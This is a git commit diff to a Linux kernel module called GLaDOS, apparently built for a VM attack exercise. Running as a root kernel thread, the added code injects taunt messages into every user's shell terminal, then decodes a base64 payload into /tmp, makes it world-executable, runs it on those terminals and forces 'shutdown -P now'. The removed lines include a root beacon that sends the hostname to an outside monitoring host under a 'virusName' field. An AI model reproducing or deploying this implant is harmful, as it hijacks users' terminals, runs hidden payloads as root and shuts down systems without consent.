102bc342312dcf8f315b0e29d28a8c022594cffe
Alex Interrante-Grant <a.interrantegrant@gmail.com>
2017-10-17 10:22:03 -0400

    changed periodic pestering and burn the VM after 1:15 uptime

--- alex/GLaDOS/GLaDOS.c
+++ alex/GLaDOS/GLaDOS.c
@@ -6,73 +6,76 @@
 #include <linux/delay.h>
 
 #define FILENAME "/tmp/song"
-#define INTERVAL_SECONDS 300
-#define CHECKIN_INTERVAL_SECONDS 5
-
-char *cmd = "/bin/echo "
-#include "song/song_b64.txt"
-" | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
-"/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file &'";
-
-char *checkin = "curl -XGET http://monitor.daviddworken.com:8080/api/submit?id=`hostname`&virusName=4";
-
-static void GLaDOS_cake(void) {
-    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
-    static char *envp[] = {
-        "SHELL=/bin/bash",
-        "HOME=/root",
-        "USER=root",
-        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
-        "DISPLAY=:0",
-        "PWD=/root", 
-        NULL
-    };
-
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-
-}
+#define INTERVAL_SECONDS 90
 
 int stop;
-int thread_function(void *data) {
-    char *checkin_argv[] = { "/bin/bash", "-c", checkin, NULL };
-    static char *envp[] = {
-        "SHELL=/bin/bash",
-        "HOME=/root",
-        "USER=root",
-        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
-        "DISPLAY=:0",
-        "PWD=/root",
-        NULL
-    };
+struct task_struct *task;
 
+static char *envp[] = {
+    "SHELL=/bin/bash",
+    "HOME=/root",
+    "USER=root",
+    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
+    "DISPLAY=:0",
+    "PWD=/root",
+    NULL
+};
+
+#define SAY "/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/%%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c 'echo %s > file &'"
+
+static void GLaDOS_say(char *message) {
+    char cmd[512];
+    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
+
+    sprintf(cmd, SAY, message);
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+char *quotes[] = {
+#include "quotes.txt"
+NULL };
+
+int taunt_counter = 0;
+
+static void GLaDOS_taunt(void) {
+    if(taunt_counter < 30) {
+        GLaDOS_say(quotes[taunt_counter]);
+        taunt_counter++;
+    }
+    else if (taunt_counter == 30) {
+        char *cake = "/bin/echo "
+        #include "song/song_b64.txt"
+        " | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
+        "/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/\%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file; '"
+        "shutdown -P now";
+
+        char *argv[] = { "/bin/bash", "-c", cake, NULL };
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        taunt_counter++;
+    }
+}
+
+int GLaDOS_thread(void *data) {
     stop = 0;
-    int loops = 0;
 
     while(true) {
-        if(loops == INTERVAL_SECONDS / CHECKIN_INTERVAL_SECONDS) {
-            printk("[GLaDOS][+] cake\n");
-            GLaDOS_cake();
-            loops = 0;
-        }
+        #ifdef DEBUG
+        printk("[GLaDOS][+] cake\n");
+        #endif
 
-        msleep_interruptible(CHECKIN_INTERVAL_SECONDS * 1000);
-        call_usermodehelper(checkin_argv[0], checkin_argv, envp, UMH_WAIT_EXEC);
-        loops++;
+        GLaDOS_taunt();
+        msleep_interruptible(INTERVAL_SECONDS * 1000);
 
         if(stop) return 0;
     }
-
 }
 
-int data;
-struct task_struct *task;
-
 static int __init GLaDOS_init(void) {
+    #ifdef DEBUG
     printk("[GLaDOS][+] installed\n");
+    #endif
 
-    task = kthread_run(&thread_function, (void *)data, "GLaDOS");
-
-    printk("[GLaDOS][+] started kernel thread\n");
+    task = kthread_run(&GLaDOS_thread, NULL, "GLaDOS");
 
     return 0;
 }
@@ -81,7 +84,9 @@ static void __exit GLaDOS_exit(void) {
     stop = 1;
     kthread_stop(task);
 
+    #ifdef DEBUG
     printk("[GLaDOS][+] uninstalled\n");
+    #endif
 
     return;
 }
